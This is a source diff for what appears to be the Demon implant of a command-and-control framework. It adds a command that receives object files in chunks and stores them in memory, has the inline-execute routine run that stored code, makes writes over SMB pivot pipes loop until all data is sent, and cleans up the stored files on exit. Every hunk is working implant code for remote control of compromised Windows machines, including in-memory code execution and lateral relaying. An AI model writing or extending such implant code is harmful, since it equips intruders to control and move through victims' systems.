@@ -35,6 +35,7 @@ SEC_DATA DEMON_COMMAND DemonCommands[] = {
         { .ID = DEMON_COMMAND_TRANSFER,                 .Function = CommandTransfer                 },
         { .ID = DEMON_COMMAND_SOCKET,                   .Function = CommandSocket                   },
         { .ID = DEMON_COMMAND_KERBEROS,                 .Function = Commandkerberos                 },
+        { .ID = DEMON_COMMAND_MEM_FILE,                 .Function = CommandMemFile                  },
         { .ID = DEMON_EXIT,                             .Function = CommandExit                     },
 
         // End
@@ -129,7 +130,8 @@ VOID CommandDispatcher( VOID )
                     }
                 }
 
-            } while ( Parser.Length > 4 );
+                //PRINTF("TaskParser.Length: %x\n", TaskParser.Length);
+            } while ( Parser.Length > 12 );
 
             MemSet( DataBuffer, 0, DataBufferSize );
             Instance.Win32.LocalFree( *( PVOID* ) DataBuffer );
@@ -1035,13 +1037,30 @@ LEAVE:
 
 VOID CommandInlineExecute( PPARSER Parser )
 {
-    DWORD FunctionNameSize = 0;
-    DWORD ObjectDataSize   = 0;
-    DWORD ArgSize          = 0;
-    PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
-    PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
-    PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
-    INT32 Flags            = ParserGetInt32( Parser );
+    DWORD     FunctionNameSize = 0;
+    DWORD     ObjectDataSize   = 0;
+    DWORD     ArgSize          = 0;
+    PCHAR     ObjectData       = NULL;
+    PMEM_FILE MemFile          = NULL;
+    PCHAR     FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
+    ULONG     MemFileID        = ParserGetInt32( Parser );
+    PCHAR     ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
+    INT32     Flags            = ParserGetInt32( Parser );
+
+    MemFile = GetMemFile( MemFileID );
+    if ( MemFile && MemFile->IsCompleted )
+    {
+        ObjectData     = MemFile->Data;
+        ObjectDataSize = MemFile->Size;
+    }
+    else if ( MemFile && ! MemFile->IsCompleted )
+    {
+        PRINTF( "MemFile [%x] was not completed\n", MemFileID );
+    }
+    else
+    {
+        PRINTF( "MemFile [%x] not found\n", MemFileID );
+    }
 
     switch ( Flags )
     {
@@ -1078,7 +1097,7 @@ VOID CommandInlineExecute( PPARSER Parser )
         }
     }
 
-    MemSet( ObjectData, 0, ObjectDataSize );
+    RemoveMemFile( MemFileID );
 }
 
 VOID CommandInjectDLL( PPARSER Parser )
@@ -2372,6 +2391,8 @@ VOID CommandPivot( PPARSER Parser )
 
             UINT32      DemonId   = ParserGetInt32( Parser );
             INT         Size      = 0;
+            INT         Written   = 0;
+            INT         Sent      = 0;
             PVOID       Data      = ParserGetBytes( Parser, &Size );
             PPIVOT_DATA TempList  = Instance.SmbPivots;
             PPIVOT_DATA PivotData = NULL;
@@ -2382,14 +2403,12 @@ VOID CommandPivot( PPARSER Parser )
                 return;
             }
 
-            PRINTF( "Search DemonId => %x\n", DemonId );
             do
             {
                 if ( TempList ) {
                     // if the specified demon was found break the loop
                     if ( TempList->DemonID == DemonId ) {
                         PivotData = TempList;
-                        PRINTF( "Found Demon: %x\n", TempList->DemonID );
                         break;
                     }
                     // select the next pivot
@@ -2399,12 +2418,18 @@ VOID CommandPivot( PPARSER Parser )
 
             if ( PivotData )
             {
-                if ( ! Instance.Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
+                while ( Sent != Size )
                 {
-                    PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
-                    CALLBACK_GETLASTERROR
-                } else PUTS( "Successful wrote demon data" )
-            } else PUTS( "Didn't found demon pivot" )
+                    if ( ! Instance.Win32.WriteFile( PivotData->Handle, U_PTR( Data ) + Sent, Size - Sent, &Written, NULL ) )
+                    {
+                        PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
+                        CALLBACK_GETLASTERROR
+                        break;
+                    }
+                    Sent += Written;
+                }
+                PRINTF( "Successfully wrote %x bytes of data to demon %x\n", Size, DemonId )
+            } else PRINTF( "Didn't found demon pivot %x\n", DemonId )
 
             // DEMON_PIVOT_SMB_COMMAND does not send any response
             // TODO: send confirmation that it worked?
@@ -3011,6 +3036,32 @@ VOID Commandkerberos( PPARSER Parser )
     PackageTransmit( Package, NULL, NULL );
 }
 
+VOID CommandMemFile( PPARSER Parser )
+{
+    PPACKAGE   Package = NULL;
+    ULONG32    ID      = 0;
+    BUFFER     Data    = { 0 };
+    SIZE_T     Size    = 0;
+    PMEM_FILE  MemFile = NULL;
+
+    Package = PackageCreate( DEMON_COMMAND_MEM_FILE );
+
+    PUTS("MemFile")
+
+    ID          = ParserGetInt32( Parser );
+    Size        = ParserGetInt64( Parser );
+    Data.Buffer = ParserGetBytes( Parser, &Data.Length );
+
+    // TODO: handle out of order packets?
+
+    MemFile = ProcessMemFileChunk( ID, Size, Data.Buffer, Data.Length );
+
+    PackageAddInt32( Package, ID );
+    PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );
+
+    PackageTransmit( Package, NULL, NULL );
+}
+
 BOOL InWorkingHours( )
 {
     SYSTEMTIME SystemTime   = { 0 };
@@ -3079,6 +3130,8 @@ VOID CommandExit( PPARSER Parser )
     PSOCKET_DATA     SocketEntry   = NULL;
     PDOWNLOAD_DATA   DownloadList  = Instance.Downloads;
     PDOWNLOAD_DATA   DownloadEntry = NULL;
+    PMEM_FILE        MemFileList   = Instance.MemFiles;
+    PMEM_FILE        MemFileEntry  = NULL;
     PPIVOT_DATA      SmbPivotList  = Instance.SmbPivots;
     PPIVOT_DATA      SmbPivotEntry = NULL;
 
@@ -3134,6 +3187,18 @@ VOID CommandExit( PPARSER Parser )
         DownloadList = DownloadList->Next;
 
         DownloadRemove( DownloadEntry->FileID );
+    }
+
+    // remove memfiles
+    for ( ;; )
+    {
+        if ( ! MemFileList )
+            break;
+
+        MemFileEntry = MemFileList;
+        MemFileList = MemFileList->Next;
+
+        RemoveMemFile( MemFileEntry->ID );
     }
 
     // free the DownloadChunk buffer
